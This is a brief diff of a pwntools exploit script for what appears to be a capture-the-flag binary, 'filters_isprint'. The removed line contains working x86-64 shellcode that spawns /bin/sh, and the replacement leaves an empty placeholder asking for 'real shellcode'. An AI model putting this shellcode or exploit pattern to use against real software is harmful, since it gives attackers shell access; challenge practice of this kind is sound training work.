@@ -3,7 +3,9 @@ context.arch = 'amd64'
 
 p = process("./filters_isprint")
 
-shellcode = b"\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05"
+# pls find real shellcode
+shellcode = b""
+print(shellcode)
 
 p.send(shellcode)
 p.interactive()
